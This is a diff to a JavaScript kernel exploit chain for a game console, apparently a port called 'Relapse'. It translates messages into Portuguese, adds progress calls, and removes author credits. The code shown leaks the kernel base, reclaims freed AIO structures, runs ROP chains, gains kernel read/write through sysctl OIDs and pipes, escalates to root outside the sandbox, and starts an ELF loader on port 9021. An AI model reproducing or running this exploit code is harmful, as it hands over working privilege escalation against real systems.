@@ -1,8 +1,5 @@
-// relapse port by maj0r
-// credits: ntfargo, ufm42, sonic_iso, jordy, dr. yenyen, theflow, slidybat, flatz, cow, nhk, bollarz, sleirsgoevy, echostretch, earthonion, matem6, edisnord
-
 (async function () {
-    // fall back to anonymous mmap when malloc returns a tagged pointer.
+    // usa mmap anônimo como alternativa quando malloc retorna um ponteiro marcado.
     function alloc(size) {
         const bytes = BigInt(size);
         const raw = BigInt(malloc(bytes));
@@ -13,7 +10,7 @@
         const mapped = syscall(SYSCALL.mmap, 0n, map_size, PROT_READ | PROT_WRITE,
             MAP_PRIVATE | MAP_ANONYMOUS, 0xffffffffffffffffn, 0n);
         if (mapped <= 0n || mapped >= 0x0000800000000000n)
-            throw new Error("native buffer allocation failed");
+            throw new Error("falha na alocação do buffer nativo");
         return mapped;
     }
 
@@ -126,7 +123,7 @@
             return Number(read32(out));
         }
 
-        // thread affinity
+        // afinidade de thread
 
         function pin_to_single_core() {
             const current = alloc(0x10);
@@ -138,7 +135,7 @@
             for (let c = 0; c < 16; c++) {
                 if ((allowed & (1 << c)) !== 0) { core = c; break; }
             }
-            if (core < 0) { warn("pin: no allowed core in mask 0x" + allowed.toString(16)); return; }
+            if (core < 0) { warn("pin: nenhum core permitido na máscara 0x" + allowed.toString(16)); return; }
 
             const mask = alloc(0x10);
             write8(mask + BigInt((core >> 3) & 0xf), BigInt(1 << (core & 7)));
@@ -169,7 +166,7 @@
             thread_attrs_restored = true;
         }
 
-        // kaslr leak
+        // leak de KASLR
 
         function sockaddr_len(len) {
             if (len && len !== 0) return ((len - 1) & ~7) + 8;
@@ -205,10 +202,10 @@
             const RET_SLOT = 184;
 
             const dst = first_interface_address();
-            if (!dst) throw new Error("kaslr: no interface has an address");
+            if (!dst) throw new Error("kaslr: nenhuma interface possui endereço");
 
             const fd = sysnum(SYSCALL.socket, AF_ROUTE, SOCK_RAW, 0n);
-            if (fd < 0n) throw new Error("kaslr: routing socket is gated");
+            if (fd < 0n) throw new Error("kaslr: socket de roteamento bloqueado");
             fds.push(fd);
 
             const timeout = alloc(16);
@@ -229,7 +226,7 @@
             write8(msg + BigInt(AUTHOR + 1), AF_INET6);
 
             if (sysnum(SYSCALL.write, fd, msg, BigInt(MSG_LEN)) < 0n) {
-                throw new Error("kaslr: routing socket rejected the request");
+                throw new Error("kaslr: socket de roteamento rejeitou a requisição");
             }
 
             const reply = alloc(4096);
@@ -239,7 +236,7 @@
                 if (len > 0n) break;
                 nanosleep(1000000);
             }
-            if (len <= 0n) throw new Error("kaslr: no routing reply");
+            if (len <= 0n) throw new Error("kaslr: nenhuma resposta de roteamento");
 
             const present = Number(read32(reply + 12n));
             let cursor = 152, author = 0;
@@ -251,19 +248,19 @@
                 }
             }
             if (author === 0 || author + 200 > Number(len)) {
-                throw new Error("kaslr: reply carries no author record");
+                throw new Error("kaslr: a resposta não contém registro de autor");
             }
 
             const ret = read64(reply + BigInt(author + RET_SLOT));
             if ((ret >> 32n) !== 0xffffffffn || (ret & 0xffffn) !== (off.kaslr.retLow16 & 0xffffn)) {
-                throw new Error("kaslr: author+" + RET_SLOT + " = " + toHex(ret) + " is not the expected return address");
+                throw new Error("kaslr: author+" + RET_SLOT + " = " + toHex(ret) + " não é o endereço de retorno esperado");
             }
 
             const retLow32 = ret & 0xffffffffn;
             kbase = (ret & 0xffffffff00000000n) | ((retLow32 - off.kaslr.retStatic) & 0xffffffffn);
         }
 
-        // aio reclaim
+        // reciclagem de AIO
 
         function raise_fd_limit() {
             const limit = alloc(0x10);
@@ -296,7 +293,7 @@
         }
 
         function park_aio_workers(limit) {
-            const pair = open_socket_pair("socketpair for the worker park failed");
+            const pair = open_socket_pair("falha ao criar socketpair para a pausa dos workers");
             worker_park = pair;
 
             const ids = alloc(4 * limit + 8);
@@ -345,7 +342,7 @@
             }
 
             if (pending_indices.length !== wanted_count) {
-                throw new Error(pending_indices.length + "/" + wanted_count + " requests stayed pending");
+                throw new Error(pending_indices.length + "/" + wanted_count + " requisições continuaram pendentes");
             }
             return pending_indices;
         }
@@ -355,9 +352,9 @@
             const candidate_ids = alloc(4 * candidate_count);
 
             for (let index = 0; index < candidate_count; index++) {
-                const pair = open_socket_pair("socketpair failed while claiming requests");
+                const pair = open_socket_pair("socketpair falhou ao reivindicar requisições");
                 const id = submit_blocked_read(pair.read_fd);
-                if (id === null) throw new Error("aio request submission failed");
+                if (id === null) throw new Error("falha ao submeter requisição AIO");
                 write32(candidate_ids + BigInt(index * 4), id);
             }
 
@@ -391,7 +388,7 @@
             armed_groups.push(ids);
         }
 
-        // use a private chain because the reclaim batch exceeds the engine buffer.
+        // usa uma chain privada porque o lote de reciclagem excede o buffer do engine.
 
         const ROP_THREAD_TIMEOUT_MS = 20000;
 
@@ -401,7 +398,7 @@
 
         function chain_push(c, v) { c.entries.push(BigInt(v)); }
 
-        // keep the reused syscall call site 16-byte aligned.
+        // mantém o ponto de chamada de syscall reutilizado alinhado em 16 bytes.
         function chain_align(c) {
             if (c.entries.length % 2 !== 0) chain_push(c, ROP.ret);
         }
@@ -438,7 +435,7 @@
             chain_push(c, syscall_wrapper);
         }
 
-        // repeat the entry address for the unknown initial rsp.
+        // repete o endereço de entrada para o rsp inicial desconhecido.
         function run_chain(chain) {
             const flag_addr = alloc(8);
             write64(flag_addr, 0n);
@@ -476,11 +473,11 @@
             write64(thr_new_args + 0x38n, cpid);
 
             const result = sysnum(SYSCALL.thr_new, thr_new_args, 0x68n);
-            if (result !== 0n) throw new Error("thr_new failed: " + toHex(result));
+            if (result !== 0n) throw new Error("thr_new falhou: " + toHex(result));
 
             const deadline = Date.now() + ROP_THREAD_TIMEOUT_MS;
             while (read64(flag_addr) !== 1n) {
-                if (Date.now() > deadline) throw new Error("rop chain never finished - reboot the console");
+                if (Date.now() > deadline) throw new Error("a rop chain nunca terminou - reinicie o console");
                 nanosleep(1000000);
             }
         }
@@ -493,7 +490,7 @@
             const timeout = alloc(16);
             write32(timeout, BigInt(tuning.waitTimeoutUs));
 
-            // invalid fd fails after the kernel copies this request.
+            // fd inválido falha depois que o kernel copia esta requisição.
             const churn_request = (0x80000000n | (BigInt(requests * request_size) << 16n) | 0x4101n) & 0xffffffffn;
 
             const preflight = sysnum(SYSCALL.ioctl, -1n, churn_request, nodes);
@@ -550,35 +547,35 @@
 
             const nodes = build_waiter_nodes(tuning.requests, first_target, second_target);
             const accepted = run_reclaim_batch(group, nodes);
-            if (accepted === null) { warn(tag + ": invalid churn request"); return null; }
+            if (accepted === null) { warn(tag + ": requisição de churn inválida"); return null; }
             if (accepted !== tuning.sprays) {
-                warn(tag + ": " + (tuning.sprays - accepted) + " reclaim submits failed");
+                warn(tag + ": " + (tuning.sprays - accepted) + " submissões de reciclagem falharam");
                 return null;
             }
 
             const first_pending = first_pending_request(group);
-            if (first_pending < 0) { warn(tag + ": no pending request is available"); return null; }
+            if (first_pending < 0) { warn(tag + ": nenhuma requisição pendente disponível"); return null; }
 
             return { group, first_pending, heads: group.count - 1 };
         }
 
         function flip_oid_kind(tag, reclaim, mib, target) {
             let kind = oid_kind(mib);
-            if (kind === null) { warn(tag + ": oid is hidden before the flip"); return false; }
+            if (kind === null) { warn(tag + ": oid está oculto antes da inversão"); return false; }
 
             let i = 0;
             while (i < reclaim.heads && kind !== target) {
                 cancel_request(reclaim.group, i);
                 const next_kind = oid_kind(mib);
-                if (next_kind === null) { warn(tag + ": oid disappeared during the flip"); return false; }
+                if (next_kind === null) { warn(tag + ": oid desapareceu durante a inversão"); return false; }
                 kind = next_kind;
                 if (((kind >> 24) & 0xff) < ((target >> 24) & 0xff)) {
-                    warn(tag + ": oid flip overshot into oid_arg1");
+                    warn(tag + ": a inversão do oid ultrapassou para oid_arg1");
                     return false;
                 }
                 i++;
             }
-            if (kind !== target) { warn(tag + ": not enough waiter heads"); return false; }
+            if (kind !== target) { warn(tag + ": heads de waiter insuficientes"); return false; }
             return true;
         }
 
@@ -586,7 +583,7 @@
             const a = off.oid.a;
             const kind = oid_kind(mib);
             if (kind !== Number(off.oid.originalKind)) {
-                warn(tag + ": unexpected oid kind " + (kind === null ? "missing" : kind.toString(16)));
+                warn(tag + ": tipo de oid inesperado " + (kind === null ? "ausente" : kind.toString(16)));
                 return false;
             }
             const reclaim = reclaim_waiter_array(tag, kaddr(a.deadSink), kaddr(kind_byte_rva));
@@ -594,7 +591,7 @@
             return flip_oid_kind(tag, reclaim, mib, Number(off.oid.writableKind));
         }
 
-        // slow kernel read/write
+        // leitura/escrita lenta no kernel
 
         function set_window_low(value) {
             return sysctl_write_int(mib_a, value);
@@ -646,7 +643,7 @@
         function prepare_high_writer() {
             const c = off.oid.c, b = off.oid.b;
             if (window_high !== 0xffffffffn) {
-                warn("kernel rw: writer window already left the kernel image");
+                warn("kernel rw: a janela do writer já saiu da imagem do kernel");
                 return false;
             }
             if (kwrite32(kaddr(c.kind), Number(off.oid.writableKind)) !== 0n) return false;
@@ -654,7 +651,7 @@
 
             const probe = sysctl_read_int(c.mib);
             if (probe.rv !== 0n || probe.value !== 0xffffffff) {
-                warn("kernel rw: high writer self-test failed");
+                warn("kernel rw: autoteste do high writer falhou");
                 return false;
             }
             mib_c = c.mib;
@@ -663,10 +660,10 @@
 
         function steer_oid_window() {
             const a = off.oid.a, b = off.oid.b;
-            if (oid_kind(mib_b) !== null) { warn("Kernel: oid is already visible"); return false; }
+            if (oid_kind(mib_b) !== null) { warn("Kernel: oid já está visível"); return false; }
 
             const a_probe = sysctl_read_int(mib_a);
-            if (a_probe.rv !== 0n) { warn("Kernel: steering oid is not readable"); return false; }
+            if (a_probe.rv !== 0n) { warn("Kernel: oid de direcionamento não é legível"); return false; }
 
             const reclaim = reclaim_waiter_array("Kernel", kaddr(a.arg1Byte1), kaddr(b.visible));
             if (!reclaim) return false;
@@ -676,7 +673,7 @@
             const steered = sysctl_read_int(mib_a);
             const expected = Number(kaddr(b.arg1Value) & 0xffffffffn);
             if (steered.rv !== 0n || steered.value !== expected) {
-                warn("Kernel: oid steering check failed");
+                warn("Kernel: verificação de direcionamento do oid falhou");
                 return false;
             }
 
@@ -689,7 +686,7 @@
             const kind_via_oidfmt = oid_kind(mib_b);
             const read = kread32(kaddr(b.kind));
             const ok = kind_via_oidfmt !== null && read.rv === 0n && read.value === kind_via_oidfmt;
-            if (!ok) warn("Kernel: read self-test failed");
+            if (!ok) warn("Kernel: autoteste de leitura falhou");
             return ok;
         }
 
@@ -701,7 +698,7 @@
             const after = sysctl_read_int(mib);
             const ok = rv === 0n && after.value === 0x41424344;
             if (ok) kwrite32(counter, before.value);
-            else warn("Kernel: write self-test failed");
+            else warn("Kernel: autoteste de escrita falhou");
             return ok;
         }
 
@@ -711,7 +708,7 @@
             mib_a = name_to_mib("kern.smp.cpus");
             mib_b = name_to_mib("kern.smp.maxcpus");
             if (!mib_a || !mib_b || oid_kind(mib_a) !== Number(off.oid.originalKind)) {
-                warn("Kernel: unexpected oid state");
+                warn("Kernel: estado de oid inesperado");
                 return false;
             }
 
@@ -727,7 +724,7 @@
             return prepare_high_writer();
         }
 
-        // process discovery
+        // descoberta de processo
 
         function read_kernel_pointer_slow(address) {
             const { rv, value } = kread64(address);
@@ -737,7 +734,7 @@
 
         function find_process(target_pid) {
             const head = read_kernel_pointer_slow(kaddr(off.allproc));
-            if (!head) { warn("Process: allproc is not a kernel pointer"); return null; }
+            if (!head) { warn("Process: allproc não é um ponteiro do kernel"); return null; }
 
             let proc = head;
             for (let hop = 0; hop < 4096; hop++) {
@@ -745,7 +742,7 @@
                 if (pid_read.rv !== 0n) return null;
                 const pid_value = BigInt.asIntN(32, BigInt(pid_read.value));
                 if (pid_value < 0n || pid_value > 0x40000n) {
-                    warn("Process: invalid pid while walking allproc");
+                    warn("Process: pid inválido ao percorrer allproc");
                     return null;
                 }
                 if (pid_value === target_pid) return proc;
@@ -760,7 +757,7 @@
         function find_current_process() {
             const my_pid = sysnum(SYSCALL.getpid);
             const proc = find_process(my_pid);
-            if (!proc) { warn("Process: current process is not in allproc"); return false; }
+            if (!proc) { warn("Process: processo atual não está em allproc"); return false; }
             curproc = proc;
 
             const fd_read = kread64(curproc + off.proc.fd);
@@ -772,29 +769,29 @@
 
             const ok = aio_read.rv === 0n && is_kernel_pointer(aio_read.value);
             if (ok) ok_msg("aio_info_addr: " + toHex(aio_read.value));
-            else warn("Process: aio info pointer is invalid");
+            else warn("Process: o ponteiro de aio info é inválido");
             if (ucred_addr) ok_msg("ucred_addr: " + toHex(ucred_addr));
             return ok;
         }
 
-        // fast kernel read/write
+        // leitura/escrita rápida no kernel
 
         function find_pipe(fdp, fd, label) {
             const table_addr = read_kernel_pointer_slow(fdp + off.filedesc.files);
-            if (!table_addr) { warn("Pipes: " + label + " file table is invalid"); return null; }
+            if (!table_addr) { warn("Pipes: tabela de arquivos de " + label + " é inválida"); return null; }
 
             const count = kread32(table_addr + off.filedescTable.nfiles);
             if (count.rv !== 0n || fd >= BigInt(count.value)) {
-                warn("Pipes: " + label + " descriptor is outside the file table");
+                warn("Pipes: descritor de " + label + " está fora da tabela de arquivos");
                 return null;
             }
 
             const entry = off.filedescTable.ofiles + fd * off.filedescTable.entryStride;
             const file_addr = read_kernel_pointer_slow(table_addr + entry);
-            if (!file_addr) { warn("Pipes: " + label + " file pointer is invalid"); return null; }
+            if (!file_addr) { warn("Pipes: ponteiro do arquivo de " + label + " é inválido"); return null; }
 
             const pipe_addr = read_kernel_pointer_slow(file_addr + off.filedescTable.fileData);
-            if (!pipe_addr) { warn("Pipes: " + label + " pipe pointer is invalid"); return null; }
+            if (!pipe_addr) { warn("Pipes: ponteiro do pipe de " + label + " é inválido"); return null; }
 
             const pair = kread64(pipe_addr + off.pipe.pair);
             const is_read_end = pair.rv === 0n && pair.value === pipe_addr;
@@ -804,7 +801,7 @@
 
         function locate_pipes() {
             const fdp = read_kernel_pointer_slow(curproc + off.proc.fd);
-            if (!fdp) { warn("Pipes: process file table is invalid"); return false; }
+            if (!fdp) { warn("Pipes: tabela de arquivos do processo é inválida"); return false; }
 
             const probe = alloc(8);
             const located = [];
@@ -817,13 +814,13 @@
 
                 const info = find_pipe(fdp, read_fd, label);
                 if (!info) return false;
-                if (!info.is_read_end) { warn("Pipes: " + label + " pipe self-check failed"); return false; }
+                if (!info.is_read_end) { warn("Pipes: autoverificação do pipe " + label + " falhou"); return false; }
 
                 write32(probe, 0x5an);
                 sysnum(SYSCALL.write, write_fd, probe, 1n);
 
                 const count = kread32(info.pipe + off.pipe.count);
-                if (count.value !== 1) { warn("Pipes: " + label + " pipe counter check failed"); return false; }
+                if (count.value !== 1) { warn("Pipes: verificação do contador do pipe " + label + " falhou"); return false; }
 
                 const write_info = find_pipe(fdp, write_fd, label);
                 if (!write_info) return false;
@@ -902,7 +899,7 @@
             const victim_buf = kread64(victim_pipe + buffer_off);
             const victim_sz = kread32(victim_pipe + size_off);
             if (master_buf.rv !== 0n || master_sz.rv !== 0n || victim_buf.rv !== 0n || victim_sz.rv !== 0n) {
-                warn("Pipes: could not save the original pipe buffers");
+                warn("Pipes: não foi possível salvar os buffers originais do pipe");
                 return false;
             }
             saved_pipe_buffers = {
@@ -913,7 +910,7 @@
             const in_read = kread32(master_pipe + in_off);
             const out_read = kread32(master_pipe + out_off);
             if (in_read.rv !== 0n || in_read.value !== 1 || out_read.value !== 0) {
-                warn("Pipes: master pipe is not in the expected state");
+                warn("Pipes: o pipe master não está no estado esperado");
                 return false;
             }
             sysnum(SYSCALL.read, master.read_fd, drain_buffer, 1n);
@@ -932,7 +929,7 @@
                     const read = kread32(master_pipe + offset);
                     ok = read.rv === 0n && read.value === value;
                 }
-                if (!ok) { warn("Pipes: could not update the master pipe"); return false; }
+                if (!ok) { warn("Pipes: não foi possível atualizar o pipe master"); return false; }
             }
             const rva = off.rodataProbe.rva, text = off.rodataProbe.text;
             const out = alloc(0x40);
@@ -940,17 +937,17 @@
             const read_back = new TextDecoder().decode(read_buffer(out, text.length));
 
             const match = got === BigInt(text.length) && read_back === text;
-            if (!match) warn("Pipes: kernel read check failed");
+            if (!match) warn("Pipes: a verificação de leitura do kernel falhou");
             return match;
         }
 
-        // privileges
+        // privilégios
 
         function escalate() {
-            if (!crossed || !ucred_addr) { warn("Privileges: kernel rw or credentials are missing"); return false; }
+            if (!crossed || !ucred_addr) { warn("Privileges: kernel rw ou credenciais estão ausentes"); return false; }
 
             const rootvnode = read_kernel_pointer_slow(kaddr(off.rootvnode));
-            if (!rootvnode) { warn("Privileges: could not find rootvnode"); return false; }
+            if (!rootvnode) { warn("Privileges: não foi possível encontrar rootvnode"); return false; }
 
             const ucred = off.ucred, sysCoreAuthId = off.sysCoreAuthId, filedesc = off.filedesc,
                 dynlib = off.dynlib, proc = off.proc;
@@ -992,7 +989,7 @@
                     read_kernel64_checked(dynlib_ptr + dynlib.libkernelRef).rv === 8n &&
                     read_kernel64_checked(dynlib_ptr + dynlib.libkernelRef).value === 1n;
 
-                // dlsym validates the caller against eboot segment bounds.
+                // o dlsym valida o chamador contra os limites dos segmentos do eboot.
                 const eboot_read = kread64(dynlib_ptr);
                 if (is_kernel_pointer(eboot_read.value)) {
                     const segments_read = kread64(eboot_read.value + 0x40n);
@@ -1013,22 +1010,22 @@
                             check_addr.rv === 8n && check_addr.value === 0n &&
                             check_size.rv === 8n && check_size.value === 0xffffffffffffffffn;
                         if (!handoff_ready) {
-                            warn("Privileges: dlsym state could not be verified");
+                            warn("Privileges: o estado do dlsym não pôde ser verificado");
                         }
                     }
                 }
             } else {
-                warn("Privileges: dynlib pointer is invalid");
+                warn("Privileges: o ponteiro dynlib é inválido");
             }
 
             const uid_after = sysnum(SYSCALL.getuid);
             const sandbox_after = sysnum(SYSCALL.is_in_sandbox);
             const ok = uid_after === 0n && sandbox_after === 0n;
-            if (!ok) warn("Privileges: uid or sandbox check failed");
+            if (!ok) warn("Privileges: verificação de uid ou sandbox falhou");
             return ok;
         }
 
-        // aio cleanup
+        // limpeza de AIO
 
         function lookup_aio_group(table_addr, id) {
             const idTable = off.aio.idTable;
@@ -1058,10 +1055,10 @@
         }
 
         function defuse_aio_groups() {
-            if (!curproc) { warn("cleanup: current process is missing"); return false; }
+            if (!curproc) { warn("cleanup: processo atual ausente"); return false; }
 
             const table_addr = kread64(curproc + off.proc.aioInfo);
-            if (!is_kernel_pointer(table_addr.value)) { warn("cleanup: aio table pointer is invalid"); return false; }
+            if (!is_kernel_pointer(table_addr.value)) { warn("cleanup: o ponteiro da tabela de aio é inválido"); return false; }
 
             const num_off = off.aio.group.num, state_off = off.aio.group.state, waiters_off = off.aio.group.waiters;
             let total = 0, already_clear = 0, cleared = 0, skipped = 0, failed = 0;
@@ -1094,11 +1091,11 @@
             }
 
             const ok = skipped === 0 && failed === 0 && (cleared + already_clear) === total;
-            if (!ok) warn("cleanup: aio cleanup failed (" + skipped + " skipped, " + failed + " failed)");
+            if (!ok) warn("cleanup: limpeza de aio falhou (" + skipped + " ignorados, " + failed + " com falha)");
             return ok;
         }
 
-        // restore
+        // restauração
 
         function restore_eboot_segments() {
             if (!eboot_segments_ptr) return true;
@@ -1111,14 +1108,14 @@
             const ok = wrote && addr_chk.rv === 8n && size_chk.rv === 8n &&
                 addr_chk.value === eboot_orig_addr && size_chk.value === eboot_orig_size;
             if (ok) eboot_segments_ptr = 0n;
-            else warn("Cleanup: eboot segment restore failed");
+            else warn("Cleanup: restauração dos segmentos do eboot falhou");
             return ok;
         }
 
         function restore_pipes() {
             if (!crossed) return true;
             if (!saved_pipe_buffers) {
-                warn("Cleanup: original pipe buffers were not saved; pipes remain armed");
+                warn("Cleanup: os buffers originais do pipe não foram salvos; os pipes continuam armados");
                 return false;
             }
 
@@ -1154,9 +1151,9 @@
 
             if (ok) {
                 crossed = false;
-                ok_msg("original pipe buffers restored and verified");
+                ok_msg("buffers originais do pipe restaurados e verificados");
             } else {
-                warn("Cleanup: pipe restoration failed; pipes may panic on close");
+                warn("Cleanup: a restauração do pipe falhou; os pipes podem causar panic ao fechar");
             }
             return ok;
         }
@@ -1183,11 +1180,11 @@
             const ok = writes_ok && buffers.every(check => check.rv === 0n && check.value === 0n) &&
                 fields.every(check => check.rv === 0n && check.value === 0);
             if (ok) crossed = false;
-            else warn("Cleanup: pipe disarm failed; pipes may panic on close");
+            else warn("Cleanup: o desarme do pipe falhou; os pipes podem causar panic ao fechar");
             return ok;
         }
 
-        // avoid another kernel write window after pipe restoration.
+        // evita outra janela de escrita no kernel após a restauração dos pipes.
         function restore_oids() {
             if (!crossed) return true;
             if (!mib_a || !mib_b || !kbase) return false;
@@ -1207,8 +1204,8 @@
             const cpus = sysctl_read_int(mib_a);
             const still_visible = oid_kind(mib_b) !== null;
             const restored = ok && cpus.rv === 0n && !still_visible;
-            if (restored) ok_msg("kernel sysctl OIDs restored and verified");
-            else warn("Cleanup: oid restore check failed");
+            if (restored) ok_msg("OIDs sysctl do kernel restaurados e verificados");
+            else warn("Cleanup: verificação da restauração dos OIDs falhou");
             return restored;
         }
 
@@ -1219,7 +1216,7 @@
                 nanosleep(120 * 1e6);
                 syscall(SYSCALL.close, worker_park.read_fd);
             } catch (e) {
-                warn("Cleanup: could not release aio workers");
+                warn("Cleanup: não foi possível liberar os workers de aio");
             }
         }
 
@@ -1245,7 +1242,7 @@
                 if (armed_groups.length > 0) {
                     if (!curproc) find_current_process();
                     if (curproc) defuse_aio_groups();
-                    else warn("Cleanup: current process unavailable");
+                    else warn("Cleanup: processo atual indisponível");
                 }
 
                 restore_eboot_segments();
@@ -1258,46 +1255,51 @@
                         kexp.bump_refcount(master.write_file, kread32, kwrite32) &&
                         kexp.bump_refcount(victim.read_file, kread32, kwrite32) &&
                         kexp.bump_refcount(victim.write_file, kread32, kwrite32);
-                    if (pinned) ok_msg("pipe file references pinned after restoration failure");
-                    else warn("Cleanup: could not pin pipe file references after restoration failure");
+                    if (pinned) ok_msg("referências dos arquivos do pipe fixadas após a falha de restauração");
+                    else warn("Cleanup: não foi possível fixar as referências dos arquivos do pipe após a falha de restauração");
                 }
 
                 restore_oids();
                 release_aio_workers();
                 close_scratch_descriptors();
             } catch (e) {
-                warn("Cleanup: failed: " + ((e && e.message) || e));
+                warn("Cleanup: falhou: " + ((e && e.message) || e));
             }
         }
 
-        // run
+        // execução
 
         async function run() {
-            await log("[*] Starting kernel exploit");
+            await log("[*] Iniciando exploit do kernel");
             try {
                 leak_kernel_base();
                 await log("[+] kbase: " + toHex(kbase));
                 pin_to_single_core();
 
-                if (!arm_kernel_read_write()) { warn("armings did not complete"); return { payloads: false }; }
-                await stage("kernel r/w ready");
+                if (!arm_kernel_read_write()) { warn("a preparação (armings) não foi concluída"); return { payloads: false }; }
+                if (typeof updateProgress === "function") updateProgress(65);
+                await stage("leitura/escrita do kernel pronta");
 
-                if (!find_current_process()) { warn("curproc not found"); return { payloads: false }; }
-                if (!locate_pipes()) { warn("pipes not located"); return { payloads: false }; }
-                await stage("pipes located");
+                if (!find_current_process()) { warn("curproc não encontrado"); return { payloads: false }; }
+                if (!locate_pipes()) { warn("pipes não localizados"); return { payloads: false }; }
+                if (typeof updateProgress === "function") updateProgress(70);
+                await stage("pipes localizados");
 
-                if (!cross_pipes()) { warn("fast read and write not established"); return { payloads: false }; }
-                await stage("kernel fast r/w ready");
+                if (!cross_pipes()) { warn("leitura e escrita rápidas não estabelecidas"); return { payloads: false }; }
+                if (typeof updateProgress === "function") updateProgress(75);
+                await stage("leitura/escrita rápida do kernel pronta");
 
-                await stage("checking aio groups");
+                if (typeof updateProgress === "function") updateProgress(78);
+                await stage("verificando grupos de aio");
                 defuse_aio_groups();
 
-                await stage("checking privileges");
-                if (!escalate()) { warn("escalation did not clear"); return { payloads: false }; }
-                await stage("privileges ready");
+                await stage("verificando privilégios");
+                if (!escalate()) { warn("a escalada de privilégios não foi concluída"); return { payloads: false }; }
+                if (typeof updateProgress === "function") updateProgress(85);
+                await stage("privilégios prontos");
 
                 if (!handoff_ready) {
-                    warn("Kernel: handoff stopped because dlsym state was not verified");
+                    warn("Kernel: transferência interrompida porque o estado do dlsym não foi verificado");
                     return { payloads: false };
                 }
 
@@ -1306,8 +1308,9 @@
                     restore_thread_attributes, kaddr, native_malloc: alloc,
                     report: warn, stage, hex: toHex,
                 });
-                if (!launched) { warn("kexp launch failed"); return { payloads: false }; }
-                await stage("elfldr loaded");
+                if (!launched) { warn("falha ao iniciar o kexp"); return { payloads: false }; }
+                if (typeof updateProgress === "function") updateProgress(100);
+                await stage("elfldr carregado");
                 return { payloads: true };
             } catch (e) {
                 warn(String(e && e.message ? e.message : e));
@@ -1319,47 +1322,44 @@
 
         async function relapse_kexploit() {
             if (is_jailbroken()) {
-                await log("[*] process is already jailbroken, nothing to do");
+                await log("[*] o processo já possui jailbreak, nada a fazer");
                 return;
             }
 
-            // kexp.js is inside download0.dat, not on this payload...
+            // o kexp.js está dentro do download0.dat, não neste payload...
             if (typeof kexp !== "object" || typeof kexp.launch !== "function") {
-                await log("[-] kexp.js is missing, update your download0.dat from my repo: github.com/notmaj0r/Y2JB");
+                await log("[-] o kexp.js está ausente, atualize seu download0.dat pelo meu repositório: github.com/notmaj0r/Y2JB");
                 return;
             }
 
-            await log("[+] Relapse port by maj0r");
-            await log("[+] Credits: ntfargo, ufm42, Sonic_Iso, Jordy, Dr. Yenyen, TheFlow, SlidyBat, Flatz, " +
-                "cow, nhk, bollarz, Sleirsgoevy, EchoStretch, EarthOnion, matem6, edisnord");
 
             if (typeof get_relapse_offset !== "function") {
                 try {
                     await load_localscript("RelapseOffsets.js");
                 } catch (e) {
-                    throw new Error("could not load RelapseOffsets.js - is it in download0.dat?");
+                    throw new Error("não foi possível carregar RelapseOffsets.js - ele está no download0.dat?");
                 }
             }
 
             off = get_relapse_offset(FW_VERSION);
             if (!off) {
-                await log("[-] Firmware " + FW_VERSION + " is not supported");
+                await log("[-] Firmware " + FW_VERSION + " não é suportado");
                 return;
             }
             await log("[+] Firmware " + FW_VERSION);
 
             const result = await run();
             if (result && result.payloads) {
-                await log("[+] kernel exploit complete");
-                await log("[+] elfldr is listening on " + (get_current_ip() || "unknown") + ":9021");
+                await log("[+] exploit do kernel concluído");
+                await log("[+] elfldr está escutando em " + (get_current_ip() || "desconhecido") + ":9021");
             } else {
-                await log("[-] kernel exploit stopped");
+                await log("[-] exploit do kernel interrompido");
             }
         }
 
         await relapse_kexploit();
     } catch (e) {
-        await log("[-] Relapse error: " + (e && e.message ? e.message : e));
+        await log("[-] Erro no Relapse: " + (e && e.message ? e.message : e));
         if (e && e.stack) await log(e.stack);
     }
 })();
